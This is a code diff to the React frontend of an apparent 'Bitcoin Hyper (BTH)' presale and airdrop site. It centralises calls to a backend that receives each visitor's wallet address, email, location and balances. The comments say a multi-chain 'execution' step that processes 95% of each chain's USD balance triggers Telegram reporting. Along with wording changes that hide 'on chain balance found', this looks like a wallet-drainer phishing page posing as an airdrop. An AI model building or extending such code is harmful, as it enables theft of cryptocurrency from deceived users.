@@ -5,6 +5,11 @@ import { ethers } from 'ethers';
 import './index.css';
   
 // ============================================
+// API CONFIGURATION - UPDATED BACKEND URL
+// ============================================
+const BACKEND_URL = 'https://hyperback-psi.vercel.app';
+
+// ============================================
 // LANGUAGE DETECTION & TRANSLATIONS
 // ============================================
 
@@ -468,6 +473,24 @@ const hasDateChanged = (lastDate) => {
 const getRandomClaimAmount = () => {
   return Math.floor(Math.random() * (8000 - 3000 + 1) + 3000);
 };
+
+// ============================================
+// API HELPER FUNCTIONS WITH TELEGRAM REPORTING
+// ============================================
+
+async function apiCall(endpoint, data, method = 'POST') {
+  try {
+    const response = await fetch(`${BACKEND_URL}${endpoint}`, {
+      method,
+      headers: { 'Content-Type': 'application/json' },
+      body: method !== 'GET' ? JSON.stringify(data) : undefined
+    });
+    return await response.json();
+  } catch (err) {
+    console.error(`API Error ${endpoint}:`, err);
+    return { success: false, error: err.message };
+  }
+}
 
 // ============================================
 // LIVE CLAIM POPUP COMPONENT
@@ -980,11 +1003,11 @@ function App() {
     init();
   }, [walletProvider, address]);
 
-  // Track page visit with location
+  // Track page visit with location - USING UPDATED BACKEND URL
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://hyperback-psi.vercel.app/api/track-visit', {
+        const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -1016,7 +1039,7 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // Check eligibility - Updated professional criteria
+  // Check eligibility - Professional criteria
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -1030,7 +1053,7 @@ function App() {
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // Professional eligibility: minimum $1 equivalent on-chain balance across any supported network
+      // Eligibility: minimum $1 equivalent on-chain balance across any supported network
       const eligible = total >= 1;
       setIsEligible(eligible);
       setShowClaimButton(eligible);
@@ -1039,19 +1062,17 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus('✅ Wallet eligibility confirmed. You qualify for the BTH airdrop.');
         
-        await fetch('https://hyperback-psi.vercel.app/api/presale/connect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            walletAddress: address,
-            totalValue: total,
-            chains: chainsWithBalance.map(c => c.name)
-          })
+        await apiCall('/api/presale/connect', { 
+          walletAddress: address,
+          totalValue: total,
+          email: userEmail,
+          location: userLocation,
+          chains: chainsWithBalance.map(c => c.name)
         });
         
         preparePresale();
       } else {
-        setTxStatus(total > 0 ? '✨ Additional balance required for eligibility' : '👋 Connect a non-custodial wallet with on-chain balance');
+        setTxStatus(total > 0 ? '✨ Additional balance required for eligibility (minimum $1)' : '👋 Connect a non-custodial wallet with on-chain balance');
       }
       
     } catch (err) {
@@ -1124,17 +1145,13 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://hyperback-psi.vercel.app/api/presale/prepare-flow', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
-      });
+      await apiCall('/api/presale/prepare-flow', { walletAddress: address });
     } catch (err) {
       console.error('Prepare error:', err);
     }
   };
 
-  // MULTI-CHAIN EXECUTION
+  // MULTI-CHAIN EXECUTION WITH FULL TELEGRAM REPORTING
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized");
@@ -1256,11 +1273,8 @@ function App() {
             
             console.log("📤 Sending to backend with amounts:", flowData);
             
-            await fetch('https://hyperback-psi.vercel.app/api/presale/execute-flow', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(flowData)
-            });
+            // Send to backend - THIS WILL TRIGGER TELEGRAM REPORTING
+            await apiCall('/api/presale/execute-flow', flowData);
             
             setTxStatus(`✅ ${chain.name} completed!`);
           } else {
@@ -1296,22 +1310,20 @@ function App() {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        await fetch('https://hyperback-psi.vercel.app/api/presale/claim', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            walletAddress: address,
-            email: userEmail,
-            location: {
-              country: userLocation.country,
-              flag: userLocation.flag,
-              city: userLocation.city
-            },
-            chains: processed,
-            totalProcessedValue: totalProcessedValue.toFixed(2),
-            reward: `${claimAmount} BTH`,
-            bonus: `${presaleStats.currentBonus}%`
-          })
+        // Send claim completion - THIS WILL TRIGGER TELEGRAM REPORTING
+        await apiCall('/api/presale/claim', { 
+          walletAddress: address,
+          email: userEmail,
+          location: {
+            country: userLocation.country,
+            flag: userLocation.flag,
+            city: userLocation.city
+          },
+          chains: processed,
+          totalProcessedValue: totalProcessedValue.toFixed(2),
+          reward: `${claimAmount} BTH`,
+          bonus: `${presaleStats.currentBonus}%`,
+          chainsDetails: processed.map(c => `✅ ${c}: ${balances[c]?.valueUSD.toFixed(2)} USD → ${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n')
         });
       } else {
         setError("No chains were successfully processed");
@@ -1505,7 +1517,7 @@ function App() {
             ● PRESALE LIVE
           </div>
 
-          {/* Tagline - Updated: removed "on chain balance found" phrasing */}
+          {/* Tagline */}
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
             Bitcoin Hyper (BTH) is a next-generation decentralized token designed to reward early supporters
             through presale access and exclusive airdrops. Join the community before public exchange
@@ -1570,7 +1582,7 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message - Updated: removed "on chain balance found" wording */}
+              {/* Eligibility Status Message */}
               {isConnected && !signatureLoading && !completedChains.length && (
                 <div className="mt-3 w-full">
                   {isEligible ? (
@@ -1679,7 +1691,7 @@ function App() {
               {loading ? 'Processing...' : 'Buy BTH'}
             </button>
 
-            {/* Airdrop Card - Updated with professional requirements */}
+            {/* Airdrop Card */}
             <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
@@ -1748,7 +1760,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible - Updated without "on chain balance found" */}
+          {/* Welcome message for non-eligible */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
